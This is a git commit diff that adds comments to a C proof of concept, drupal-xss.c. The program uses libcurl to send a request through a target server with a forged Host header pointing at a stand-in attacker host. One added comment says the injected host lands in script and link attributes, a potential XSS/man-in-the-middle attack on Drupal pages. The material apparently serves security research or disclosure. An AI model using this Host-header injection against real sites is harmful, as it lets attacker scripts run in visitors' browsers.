d5a45cd9522217cb3150d3b2a32327b1723e6897
James Cuzella <james.cuzella@lyraphase.com>
2011-12-06 16:34:03 -0700

    Added helpful comments

--- drupal-xss.c
+++ drupal-xss.c
@@ -8,8 +8,8 @@ int main(int argc, char *argv[])
 {
   CURLcode ret;
   CURL *hnd = curl_easy_init();
-  curl_easy_setopt(hnd, CURLOPT_URL, "http://attackersite.example.com:80/");
-  curl_easy_setopt(hnd, CURLOPT_PROXY, "http://target.example.com:80");
+  curl_easy_setopt(hnd, CURLOPT_URL, "http://attackersite.example.com:80/"); /* HTTP port optional */
+  curl_easy_setopt(hnd, CURLOPT_PROXY, "http://target.example.com:80"); /* HTTP Port should be specified here */
   curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
   curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.21.6 (x86_64-pc-linux-gnu) libcurl/7.21.6 OpenSSL/1.0.0e zlib/1.2.3.4 libidn/1.22 librtmp/2.3");
   curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
@@ -17,6 +17,7 @@ int main(int argc, char *argv[])
 
   /* Set custom Host header */
   struct curl_slist *headers=NULL; /* init to NULL is important */
+  /* The host is inserted into the page in the src or href attribute for many tags on the returned page (Potential blended XSS-MITM attack) */
   headers = curl_slist_append(headers, "Host: attackersite.scripts.example.com");
   /* headers = curl_slist_append(headers, "X-more-headers-here: text"); */
   curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headers);/* pass our list of custom made headers */  
